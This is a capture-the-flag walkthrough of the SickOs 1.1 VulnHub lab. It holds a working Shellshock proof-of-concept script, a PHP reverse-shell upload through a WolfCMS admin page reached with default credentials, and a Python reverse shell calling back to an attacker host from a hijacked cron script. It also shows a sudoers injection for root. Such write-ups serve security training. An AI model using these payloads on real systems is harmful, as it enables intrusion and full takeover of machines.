# SickOs 1.1
[Link to vulnhub](https://www.vulnhub.com/entry/sickos-11,132/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.159.0/24
```
I found the target at **192.168.159.131**. Now I start enumerate services running on that host.

## Enumeration
```
root@BOEING:~# nmap -A -T4 -p- 192.168.159.131

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-03-03 06:26 PST
Nmap scan report for 192.168.159.131
Host is up (0.00024s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 00:0C:29:C5:2C:DA (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.159.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.06 seconds
```
From the result of Nmap, I found that the target was running 3 services
* SSH running on tcp port 22
* HTTP Proxy (squid) running on tcp port 3128
* Closed HTTP Proxy on TCP port 8080

Because Nmap detected that HTTP proxy was running on TCP port 3128 so just tried to configure proxy on the browser and I successfully accessed the web page
```
Setting browser proxy to 192.168.159.131:3128
Browse to 192.168.159.131
```

I'd like to use nikto to scan the web through proxy
```
root@BOEING:~# nikto -h 192.168.159.131 -useproxy http://192.168.159.131:3128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.159.131
+ Target Hostname:    192.168.159.131
+ Target Port:        80
+ Proxy:              192.168.159.131:3128
+ Start Time:         2017-03-03 06:57:38 (GMT-8)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Retrieved via header: 1.0 localhost (squid/3.1.19)
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
+ Uncommon header 'x-cache' found, with contents: MISS from localhost
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 16:35:02 2015
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
+ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_REQ 0
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8347 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2017-03-03 06:58:10 (GMT-8) (32 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
From Nikto's output I found:
* /robots.txt
* /cgi-bin/status
* /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
* /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
* /icons/README

## Exploitation
Since Nikto told me there was a vulnerability call **ShellShock (CVE-2014-6271)** on /cgi-bin/status but I was not going to use this vulnerability because it could be too easy and didn't challege me.

###  Shellshock PoC
Befor testing, proxy on the system must be configured
```
export http_proxy="http://p192.168.159.131:3128"
```

This is my PoC script of ShellShock (find more information about [shellshock](https://access.redhat.com/articles/1200223))
```python
import sys
import httplib2
from urllib import urlencode
import time
import socket

def send(fullURL,headers):
    # http = httplib2.Http()
    http = httplib2.Http(proxy_info = httplib2.ProxyInfo(httplib2.socks.PROXY_TYPE_HTTP_NO_TUNNEL, '192.168.159.131', 3128) )
    body = {}
    response, content = http.request(fullURL, 'GET', headers=headers, body=urlencode(body))
    return (content)


fullURL = "http://192.168.159.131/cgi-bin/status"
host = "192.168.159.131"
print ("[*] Full : " + fullURL)


print "-------------------------------"
print "[*] Testing ... "

try:
	command = "/usr/bin/id"
	header = '() { xxxxxxxxxxxxxxxxxx; }; echo ; echo ; '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 1 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, check url"

try:
	command = "/usr/bin/whoami"
	header = '() { :; }; echo ; echo ; /bin/bash -c  '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 2 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, check url"
```
And of course the web site was vulnerable!!!
```
root@BOEING:/kapi/vulnhub/sic0s1.1# python shellshock.py 
[*] Full : http://192.168.159.131/cgi-bin/status
-------------------------------
[*] Testing ... 
[*] Type 1 >> () { xxxxxxxxxxxxxxxxxx; }; echo ; echo ; /usr/bin/id;
[*] Executing command:/usr/bin/id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Type 2 >> () { :; }; echo ; echo ; /bin/bash -c  /usr/bin/whoami;
[*] Executing command:/usr/bin/whoami

www-data
```

I moved on to other point.
I first check at **/robots.txt**
```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

I accessed to **/wolfcms**
I tried to use **dirb** to check for any common paths
```
root@BOEING:/kapi/vulnhub/sic0s1.1# dirb http://192.168.159.131/wolfcms

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar  3 08:20:52 2017
URL_BASE: http://192.168.159.131/wolfcms/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.159.131/wolfcms/ ----
+ http://192.168.159.131/wolfcms/composer (CODE:200|SIZE:403)                                                                                                                       
+ http://192.168.159.131/wolfcms/config (CODE:200|SIZE:0)                                                                                                                           
==> DIRECTORY: http://192.168.159.131/wolfcms/docs/                                                                                                                                 
+ http://192.168.159.131/wolfcms/favicon.ico (CODE:200|SIZE:894)                                                                                                                    
+ http://192.168.159.131/wolfcms/index (CODE:200|SIZE:3975)                                                                                                                         
+ http://192.168.159.131/wolfcms/index.php (CODE:200|SIZE:3975)                                                                                                                     
==> DIRECTORY: http://192.168.159.131/wolfcms/public/                                                                                                                               
+ http://192.168.159.131/wolfcms/robots (CODE:200|SIZE:0)                                                                                                                           
+ http://192.168.159.131/wolfcms/robots.txt (CODE:200|SIZE:0)                                                                                                                       
                                                                                                                                                                                    
---- Entering directory: http://192.168.159.131/wolfcms/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                    
---- Entering directory: http://192.168.159.131/wolfcms/public/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Mar  3 08:21:02 2017
DOWNLOADED: 4612 - FOUND: 7
```
dirb found 7 directories and 2 of them were enabled directory listing but no one was interesting.
I goolgled for admin page of wolfcms and found [this](https://www.wolfcms.org/forum/topic2034.html) quite useful. The discussion told me that there are 2 possible admin pages **/admin** and **/?admin** depend on mod_rewrite was enable or not.
I found http://192.168.159.131/wolfcms/?admin was accessible and for a couple of trying I successfully authenticate by using admin:admin.

There was a page /wolfcms/?/admin/plugin/file_manager to manage file including upload shell.
I used [this reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey to reverse shell to my listening netcat.
When upload file had been completed. The file will be stored in /wolfcms/public/

To listening reverse shell
```
nc -v -n -l -p 1234
```

Successful exploit when I clicked on http://192.168.159.131/wolfcms/public/php-reverse-shell.php.

## Escalation
I noticed that in /var/www there is a file named **connect.py** and it's content was interesting.
```
$ ls -al
total 24
drwxrwxrwx  3 root root 4096 Dec  6  2015 .
drwxr-xr-x 13 root root 4096 Dec  6  2015 ..
-rwxrwxrwx  1 root root  109 Dec  5  2015 connect.py
-rw-r--r--  1 root root   21 Dec  5  2015 index.php
-rw-r--r--  1 root root   45 Dec  5  2015 robots.txt
drwxr-xr-x  5 root root 4096 Dec  5  2015 wolfcms
$ cat connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

I just guess it was a cron job and it could be modified by anyone!!!.
So I would like to edit python file by change it to reverse shell and if it run I will got shell with root privilege.
```
$ cat connect.py
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.159.3",8889))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
I waited for a few seconds.
```
root@BOEING:~# nc -nvlp 8889
listening on [any] 8889 ...
connect to [192.168.159.3] from (UNKNOWN) [192.168.159.131] 60617
/bin/sh: 0: can't access tty; job control turned off
# id 
uid=0(root) gid=0(root) groups=0(root)
```

## Another way to get root
I just traverse into the machine and found the config file of wolfcms at **/var/www/wolfcms/config.php** and it contained some credential.
```
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```
I list directory in /home and found that there is user **sickos** so I tried to logon SSH with user sickos and password john@123 and it worked.
```
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Mar  3 22:56:55 IST 2017

  System load:  0.0               Processes:           116
  Usage of /:   4.3% of 28.42GB   Users logged in:     0
  Memory usage: 13%               IP address for eth0: 192.168.159.131
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Mar  3 22:51:58 2017 from 192.168.159.1
sickos@SickOs:~$ 
```

To get root I modified connect.py to allow sickos to use **sudo su** 
```
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "sickos ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```
I waited for a couple seconds.
```
sickos@SickOs:~$ sudo su
[sudo] password for sickos: 
root@SickOs:/home/sickos# id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:/home/sickos# 
```
I got root!!!

## Find the flag
Flag was stored at /root
```
# ls -al
total 40
drwx------  3 root root 4096 Dec  6  2015 .
drwxr-xr-x 22 root root 4096 Sep 22  2015 ..
-rw-r--r--  1 root root   96 Dec  6  2015 a0216ea4d51874464078c618298b1367.txt
-rw-------  1 root root 3724 Dec  6  2015 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Sep 22  2015 .cache
-rw-------  1 root root   22 Dec  5  2015 .mysql_history
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-------  1 root root 5230 Dec  6  2015 .viminfo
# pwd
/root
# cat a ^H
cat: a: No such file or directory
cat:: No such file or directory
# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```


### For other information
* [ShellShock](https://access.redhat.com/articles/1200223)
* [Reverse shell cheat sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Basic privilege escalation - g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
